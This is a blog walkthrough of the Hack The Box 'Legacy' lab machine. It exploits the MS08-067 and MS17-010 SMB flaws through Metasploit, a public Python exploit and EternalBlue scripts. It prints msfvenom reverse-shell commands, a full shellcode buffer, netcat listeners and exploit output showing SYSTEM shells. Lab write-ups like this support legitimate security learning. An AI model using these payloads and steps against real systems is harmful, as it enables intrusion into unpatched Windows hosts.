---
title: "Hack The Box - Legacy " 
date: 2022-06-02T17:01:34+05:30
description: " Legacy from HackTheBox is an retired machine which is vulnerable to infamous MS08-067 & MS17-010 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit."
draft: false
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags: 
- samba
- CVE-ID-2008-4250
series:
- Pratical Ethical Hacking TCM
categories:
- Easy
- HackTheBox
- Windows
- CVE Exploitation 
- Metasploit
- Public Exploit
libraries:

image: /images/hackthebox/legacy/Legacy.png
---

Hi Hackers Welcome Back this is my very first  Hack The Box Machine which i have solved.

{{< img src="/images/hackthebox/legacy/2.png" alt="image alt" width="450px"  position="center" >}}

## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Title</th>
    <th>Legacy</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Windows</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td><a href=https://app.hackthebox.com/users/1 > ch4p </a> </td>
    </tr>
    <tr>
    <td>Maker</td>
    <td><a href=https://www.hackthebox.eu/home/users/profile/610173 > dmw </a> </td>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we find the service, which is vulnerable to infamous MS08-067 & MS17-010 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit.
## Mind Map 
{{< img src="/images/hackthebox/legacy/3.png" alt="image alt" width="1000px"  position="center" >}}

## Recon  

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy]
└──_ $nmap -sC -sV 10.129.227.181
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 13:27 IST
Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 73.47% done; ETC: 13:28 (0:00:19 remaining)
Nmap scan report for 10.129.227.181
Host is up (0.26s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE    SERVICE      VERSION
135/tcp open     msrpc        Microsoft Windows RPC
139/tcp open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open     microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:59:40 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-06-07T12:56:45+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.31 seconds

```
We can see that three ports are opened, lets dig into smb

## Enumeration
 
 Let’s first run nmap scripts to determine if it is vulnerable.

``` bash
┌─[_]─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy]
└──_ $nmap --script "vuln" 10.129.227.181 -p139,445
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 14:48 IST
Nmap scan report for 10.129.227.181
Host is up (0.57s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 35.54 seconds

```
The result shows us that it is vulnerable to CVE-2008–4250. The target machine is running SMBv1 so we’ll go with CVE-2017–0143 (MS17–010).

## Automatic Exploitation

We know the ``` CVE ID ``` search it on metasploit  and set Lhost, Rhost , target 

``` bash
[msf](Jobs:0 Agents:0) >> search 2008-4250

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> check

[-] Msf::OptionValidateError The following options failed to validate: RHOSTS
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set rhosts 10.129.227.181
rhosts => 10.129.227.181
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> check
[+] 10.129.227.181:445 - The target is vulnerable.
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> exploit

[*] Started reverse TCP handler on 192.168.132.128:4444 
[*] 10.129.227.181:445 - Automatically detecting the target...
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.129.227.181   yes       The target host(s), see https://github.com/rapid7/metasploit-fr
                                       amework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.132.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set lhost 10.10.14.102
lhost => 10.10.14.102
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> exploit

[*] Started reverse TCP handler on 10.10.14.102:4444 
[*] 10.129.227.181:445 - Automatically detecting the target...
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.129.227.181
[*] Meterpreter session 1 opened (10.10.14.102:4444 -> 10.129.227.181:1162 ) at 2022-06-02 15:39:27 +0530

 Meterpreter 2)(C:\WINDOWS\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 2)(C:\WINDOWS\system32) > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows


```
Incase if the exploit wont work reset the machine and try once more it will work. 

### user flag
User flag found under users Desktop path ```C:\Documents and Settings\john\Desktop\user.txt ```

``` powershell
Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��    <DIR>          .
16/03/2017  09:19 ��    <DIR>          ..
16/03/2017  09:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.312.239.104 bytes free

```

### Root flag

Similarly Admin flag found under Administrator Desktop 
``` C:\Documents and Settings\Administrator\Desktop\root.txt ```

``` powershell
Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18 ��    <DIR>          .
16/03/2017  09:18 ��    <DIR>          ..
16/03/2017  09:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.296.653.824 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
99344----------------------e695d5713

```

## Manual Exploitation
There are multiple MS08-67 exploits available on the internet but the one which worked the best for me is <a href=https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py> Jivoi </a> 

To make this python script work we just have to replace the default given ```Shellcode``` with our own Shellcode. generation command via ```msfvenom``` for different payload style is already given in comments by the author inside the script.

```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.102 LPORT=443 EXITFUNC=thread -b "x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows```

``` bash
┌─[atom@atom-vmwarevirtualplatform]─[~]
└──_ $msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.102 LPORT=443 EXITFUNC=thread -b "x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows 
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=55, char=0x78)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1488 bytes
unsigned char buf[] = 
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x80\x88\xaa\xc1\x83\xee\xfc\xe2\xf4\x7c\x60\x28\xc1\x80\x88"
"\xca\x48\x65\xb9\x6a\xa5\x0b\xd8\x9a\x4a\xd2\x84\x21\x93\x94"
"\x03\xd8\xe9\x8f\x3f\xe0\xe7\xb1\x77\x06\xfd\xe1\xf4\xa8\xed"
"\xa0\x49\x65\xcc\x81\x4f\x48\x33\xd2\xdf\x21\x93\x90\x03\xe0"
"\xfd\x0b\xc4\xbb\xb9\x63\xc0\xab\x10\xd1\x03\xf3\xe1\x81\x5b"
"\x21\x88\x98\x6b\x90\x88\x0b\xbc\x21\xc0\x56\xb9\x55\x6d\x41"
"\x47\xa7\xc0\x47\xb0\x4a\xb4\x76\x8b\xd7\x39\xbb\xf5\x8e\xb4"
"\x64\xd0\x21\x99\xa4\x89\x79\xa7\x0b\x84\xe1\x4a\xd8\x94\xab"
"\x12\x0b\x8c\x21\xc0\x50\x01\xee\xe5\xa4\xd3\xf1\xa0\xd9\xd2"
"\xfb\x3e\x60\xd7\xf5\x9b\x0b\x9a\x41\x4c\xdd\xe0\x99\xf3\x80"
"\x88\xc2\xb6\xf3\xba\xf5\x95\xe8\xc4\xdd\xe7\x87\x77\x7f\x79"
"\x10\x89\xaa\xc1\xa9\x4c\xfe\x91\xe8\xa1\x2a\xaa\x80\x77\x7f"
"\x91\xd0\xd8\xfa\x81\xd0\xc8\xfa\xa9\x6a\x87\x75\x21\x7f\x5d"
"\x3d\xab\x85\xe0\xa0\xcb\x8e\xee\xc2\xc3\x80\x89\x11\x48\x66"
"\xe2\xba\x97\xd7\xe0\x33\x64\xf4\xe9\x55\x14\x05\x48\xde\xcd"
"\x7f\xc6\xa2\xb4\x6c\xe0\x5a\x74\x22\xde\x55\x14\xe8\xeb\xc7"
"\xa5\x80\x01\x49\x96\xd7\xdf\x9b\x37\xea\x9a\xf3\x97\x62\x75"
"\xcc\x06\xc4\xac\x96\xc0\x81\x05\xee\xe5\x90\x4e\xaa\x85\xd4"
"\xd8\xfc\x97\xd6\xce\xfc\x8f\xd6\xde\xf9\x97\xe8\xf1\x66\xfe"
"\x06\x77\x7f\x48\x60\xc6\xfc\x87\x7f\xb8\xc2\xc9\x07\x95\xca"
"\x3e\x55\x33\x4a\xdc\xaa\x82\xc2\x67\x15\x35\x37\x3e\x55\xb4"
"\xac\xbd\x8a\x08\x51\x21\xf5\x8d\x11\x86\x93\xfa\xc5\xab\x80"
"\xdb\x55\x14";
```

Once you change the shellcode value, lessen on port 443 and execute python code 

```python3 ms08-067.py 10.129.145.24 6 445 ```

-->``` ms08-067.py ```   Is our python payload 
-->``` 10.129.145.24 ``` Ware target ip
-->``` 6 ```             Os of target user which we have found on metasploit exploit 
-->``` 445 ```           Target port

``` bash
$   Here's how to upgrade if necessary:                                                     │┌─[atom@atom-vmwarevirtualplatform]─[~]
$                                                                                           │└──_ $nc -lvnp 443
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impac│Can't grab 0.0.0.0:443 with bind : Permission denied
ket/                                                                                        │┌─[_]─[atom@atom-vmwarevirtualplatform]─[~]
$   cd impacket                                                                             │└──_ $sudo nc -lvnp 443
$   pip install .                                                                           │[sudo] password for atom: 
                                                                                            │listening on [any] 443 ...
                                                                                            │connect to [10.10.14.102] from (UNKNOWN) [10.129.145.24] 1034
#######################################################################                     │Microsoft Windows XP [Version 5.1.2600]
                                                                                            │(C) Copyright 1985-2001 Microsoft Corp.
Windows XP SP3 English (NX)                                                                 │
                                                                                            │C:\WINDOWS\system3>
[-]Initiating connection                                                                    │
[-]connected to ncacn_np:10.129.145.24[\pipe\browser]                                       │
Exploit finish                                                                              │
                                                                                            │
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy]                                 │
└──_ $python3 ms08-067.py 10.129.145.24 6 445                                               │
#######################################################################                     │
#   MS08-067 Exploit                                                                        │
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits│
/7132/).                                                                                    │
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows│
/smb/ms08_067_netapi                                                                        │
#                                                                                           │
#   Mod in 2018 by Andy Acer                                                                │
#   - Added support for selecting a target port at the command line.                        │
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport   │
#   - Changed shellcode handling to allow for variable length shellcode.                    │
#######################################################################                     │
                                                                                            │
                                                                                            │
$   This version requires the Python Impacket library version to 0_9_17 or newer.           │
$                                                                                           │
$   Here's how to upgrade if necessary:                                                     │
$                                                                                           │
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impac│
ket/                                                                                        │
$   cd impacket                                                                             │
$   pip install .                                                                           │
                                                                                            │
                                                                                            │
#######################################################################                     │
                                                                                            │
Windows XP SP3 English (NX)                                                                 │
                                                                                            │
[-]Initiating connection                                                                    │
[-]connected to ncacn_np:10.129.145.24[\pipe\browser]                                       │
Exploit finish                                                                              │

```

### Eternal Blue 
CVE-2017–0143 (MS17–010). The vulnerability we’ll be exploiting is called Eternal Blue. This vulnerability exploited Microsoft’s implementation of the Server Message Block (SMB) protocol. 

{{< notice error "Exploit error " >}}
 when i try to exploit it via Metasploit. my exploit ware succeed but i couldn't get shell, i am happy to learn from you guys, let me know if any one succeed on getting metasploit shell on this machine for this vulnerability   
 {{< /notice >}}

let's start exploiting manual method 

Download the exploit code from <a href=`https://github.com/helviojunior/MS17-010.git` >Github </a> execute by following method and make sure that you have python2 and impacket module installed on your computer.

{{< notice warning "Exploit warning " >}}
This exploit code will not work on python2 without any modification, if you have installed  both python2 and python3, you can install impacket module by using ```pip2 install impacket ```
 {{< /notice >}}

``` bash
─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy/MS17-010]      │┌─[atom@atom-vmwarevirtualplatform]─[~]
└──_ $ls                                                                  │└──_ $nc -nlvp 4444
BUG.txt                  eternalromance_leak.py  mysmb.pyc                │listening on [any] 4444 ...
checker.py               eternalromance_poc2.py  npp_control.py           │connect to [10.10.14.102] from (UNKNOWN) [10.129.145.24] 1053
eternalblue_exploit7.py  eternalromance_poc.py   README.md                │Microsoft Windows XP [Version 5.1.2600]
eternalblue_exploit8.py  eternalsynergy_leak.py  send_and_execute.py      │(C) Copyright 1985-2001 Microsoft Corp.
eternalblue_poc.py       eternalsynergy_poc.py   shellcode                │
eternalchampion_leak.py  get-pip.py              zzz_exploit.py           │C:\WINDOWS\system32>
eternalchampion_poc2.py  infoleak_uninit.py                               │
eternalchampion_poc.py   mysmb.py                                         │
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy/MS17-010]      │
└──_ $python send_and_execute.py 10.129.145.24  /home/atom/eternalblue.exe│
                                                                          │
Trying to connect to 10.129.145.24:445                                    │
Target OS: Windows 5.1                                                    │
Using named pipe: browser                                                 │
Groom packets                                                             │
attempt controlling next transaction on x86                               │
success controlling one transaction                                       │
modify parameter count to 0xffffffff to be able to write backward         │
leak next transaction                                                     │
CONNECTION: 0x8612cc18                                                    │
SESSION: 0xe11fcc18                                                       │
FLINK: 0x7bd48                                                            │
InData: 0x7ae28                                                           │
MID: 0xa                                                                  │
TRANS1: 0x78b50                                                           │
TRANS2: 0x7ac90                                                           │
modify transaction struct for arbitrary read/write                        │
make this SMB session to be SYSTEM                                        │
current TOKEN addr: 0xe11333c8                                            │
userAndGroupCount: 0x3                                                    │
userAndGroupsAddr: 0xe1133468                                             │
overwriting token UserAndGroups                                           │
Sending file Q8M20F.exe...                                                │
Opening SVCManager on 10.129.145.24.....                                  │
Creating service qqPR.....                                                │
Starting service qqPR.....                                                │
The NETBIOS connection with the remote host timed out.                    │
Removing service qqPR.....                                                │
ServiceExec Error on: 10.129.145.24                                       │
nca_s_proto_error                                                         │
Done                                                                      │

```

{{< notice success "we have successfully Pwned the Machine " >}}
See you on the next Blog, Happy hacking...
{{< /notice >}}


